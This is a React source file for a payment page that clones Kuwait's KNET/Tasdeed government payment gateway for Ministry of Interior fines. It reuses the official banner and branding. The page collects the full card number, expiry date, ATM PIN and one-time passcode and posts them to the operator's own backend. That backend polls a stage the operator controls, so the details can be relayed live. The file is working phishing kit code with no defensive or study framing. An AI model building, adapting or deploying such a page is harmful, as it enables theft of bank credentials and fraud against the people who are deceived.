import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-tasdeed-clone" dir="rtl">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #ffffff !important; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
        .knet-tasdeed-clone { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-bottom: 50px; }
        
        .tasdeed-top-header { width: 100%; max-width: 500px; padding: 10px 0; background: #fff; text-align: center; }
        .tasdeed-top-img { width: 100%; height: auto; }
        
        .tasdeed-container { width: 100%; max-width: 480px; border: 3px solid #8eb4d9; border-radius: 15px; background: #fff; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: relative; margin-top: 10px; }
        
        .tasdeed-logo-section { text-align: center; margin-bottom: 25px; }
        .tasdeed-logo-text { color: #d9534f; font-weight: bold; font-size: 24px; margin: 0; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .tasdeed-logo-text span:first-child { color: #5cb85c; }
        
        .tasdeed-section-title { color: #0082c3; font-weight: bold; font-size: 15px; text-align: left; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
        
        .tasdeed-info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #333; }
        .tasdeed-info-label { font-weight: bold; color: #0082c3; }
        .tasdeed-info-value { text-align: right; font-weight: 500; }
        
        .tasdeed-form-group { margin-bottom: 15px; display: flex; align-items: center; }
        .tasdeed-label { font-size: 14px; font-weight: bold; color: #0082c3; margin: 0; width: 160px; text-align: left; }
        
        .tasdeed-input-wrapper { flex: 1; display: flex; gap: 5px; position: relative; align-items: center; }
        .tasdeed-input { border: 1px dashed #d9534f; background: #fff; height: 32px; padding: 0 8px; font-size: 14px; outline: none; text-align: center; border-radius: 0; }
        .tasdeed-input:focus { border-style: solid; border-color: #0082c3; }
        
        .prefix-dropdown { position: absolute; top: 32px; left: 0; width: 100px; background: white; border: 1px solid #ccc; z-index: 100; max-height: 150px; overflow-y: auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .prefix-item { padding: 5px; font-size: 12px; cursor: pointer; text-align: center; border-bottom: 1px solid #eee; }
        .prefix-item:hover { background: #0082c3; color: white; }
        
        .tasdeed-actions { display: flex; gap: 10px; margin-top: 25px; }
        .btn-tasdeed { flex: 1; height: 35px; border: 1px solid #ccc; border-radius: 4px; font-weight: bold; font-size: 13px; cursor: pointer; background: #fff; color: #333; }
        .btn-tasdeed:hover { background: #f8f8f8; }
        
        .tasdeed-footer { margin-top: 25px; text-align: center; font-size: 11px; color: #0082c3; line-height: 1.6; }
        
        @media (max-width: 500px) {
          .knet-tasdeed-clone { padding: 0; }
          .tasdeed-container { border-radius: 0; border-left: none; border-right: none; }
        }
      `}</style>

      {/* Top Header Image based on Screenshots */}
      <div className="tasdeed-top-header">
        <img src="https://www.kpay.com.kw/kpg/images/top_banner.jpg" className="tasdeed-top-img" alt="MOI Banner" onError={(e) => e.currentTarget.style.display='none'} />
      </div>

      <div className="tasdeed-container">
        <div className="tasdeed-logo-section">
          <div className="tasdeed-logo-text" dir="ltr">
            <span style={{color:'#5cb85c'}}>tasdeed</span>
            <span style={{color:'#d9534f'}}>تسديد</span>
          </div>
          <div style={{fontSize:'10px', color:'#0082c3', fontWeight:'bold', marginTop:'-5px'}}>نظام الدفع الإلكتروني الحكومي</div>
        </div>

        <div className="tasdeed-section-title" dir="ltr">معلومات الفاتورة</div>
        <div className="tasdeed-info-row" dir="ltr">
          <span className="tasdeed-info-label">المستفيد:</span>
          <span className="tasdeed-info-value">Ministry of Interior</span>
        </div>
        <div className="tasdeed-info-row" dir="ltr">
          <span className="tasdeed-info-label">الموقع:</span>
          <span className="tasdeed-info-value">https://www.moi.gov.kw</span>
        </div>
        <div className="tasdeed-info-row" dir="ltr">
          <span className="tasdeed-info-label">المبلغ:</span>
          <span className="tasdeed-info-value">KD {paymentData.totalAmount}</span>
        </div>

        <div className="tasdeed-section-title mt-4" dir="ltr">معلومات البطاقة</div>
        
        {stage === "card" && (
          <form onSubmit={handleCardSubmit}>
            <div className="tasdeed-form-group" dir="ltr">
              <label className="tasdeed-label">رقم بطاقة الصراف الآلي:</label>
              <div className="tasdeed-input-wrapper">
                <input 
                  type="text" 
                  className="tasdeed-input" 
                  style={{width:'70px'}}
                  placeholder="Prefix" 
                  value={cardPrefix} 
                  onChange={e => setCardPrefix(e.target.value.replace(/\D/g, '').substring(0, 4))} 
                />
                {showPrefixes && (
                  <div className="prefix-dropdown">
                    {availablePrefixes.map(p => (
                      <div key={p} className="prefix-item" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                    ))}
                  </div>
                )}
                <input 
                  type="text" 
                  className="tasdeed-input flex-grow-1" 
                  placeholder="Card Number" 
                  value={cardNumber} 
                  onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 12))} 
                  required 
                />
              </div>
            </div>

            <div className="tasdeed-form-group" dir="ltr">
              <label className="tasdeed-label">تاريخ انتهاء البطاقة:</label>
              <div className="tasdeed-input-wrapper" style={{justifyContent:'flex-start'}}>
                <input type="text" className="tasdeed-input" style={{width:'50px'}} placeholder="YY" value={expiryYear} onChange={e => setExpiryYear(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                <span style={{alignSelf:'center'}}>/</span>
                <input type="text" className="tasdeed-input" style={{width:'50px'}} placeholder="MM" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
              </div>
            </div>

            <div className="tasdeed-form-group" dir="ltr">
              <label className="tasdeed-label">الرقم السري (PIN):</label>
              <div className="tasdeed-input-wrapper">
                <input type="password" maxLength={4} className="tasdeed-input" style={{width:'80px'}} value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
              </div>
            </div>

            <div className="tasdeed-actions" dir="ltr">
              <button type="submit" className="btn-tasdeed">إرسال</button>
              <button type="button" className="btn-tasdeed" onClick={() => setLocation("/")}>إلغاء</button>
            </div>
          </form>
        )}

        {stage === "otp" && (
          <form onSubmit={handleOtpSubmit} className="text-center">
            <div className="tasdeed-section-title" dir="ltr">OTP Verification</div>
            <p className="small text-muted mb-4">Enter the code sent to your mobile.</p>
            <input type="text" className="tasdeed-input w-75 mb-4" style={{letterSpacing:'5px', fontSize:'20px', height:'45px'}} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} placeholder="000000" required />
            <button type="submit" className="btn-tasdeed w-100">Confirm</button>
          </form>
        )}

        {stage.endsWith("_pending") && (
          <div className="text-center py-5">
            <div className="spinner-border text-primary" role="status"></div>
            <p className="mt-3 font-weight-bold" style={{color:'#0082c3'}}>Processing...</p>
          </div>
        )}

        {stage === "success" && (
          <div className="text-center py-4">
            <h4 className="text-success font-weight-bold">تمت العملية بنجاح</h4>
            <button className="btn-tasdeed w-100 mt-4" onClick={() => setLocation("/")}>العودة</button>
          </div>
        )}

        {stage === "failed" && (
          <div className="text-center py-4">
            <h4 className="text-danger font-weight-bold">فشلت العملية</h4>
            <button className="btn-tasdeed w-100 mt-4" onClick={() => setStage("card")}>حاول مرة أخرى</button>
          </div>
        )}
      </div>

      <div className="tasdeed-footer">
        جميع الحقوق محفوظة © 2026<br/>
        شركة الخدمات المصرفية الآلية المشتركة - كي نت
      </div>
    </div>
  );
}
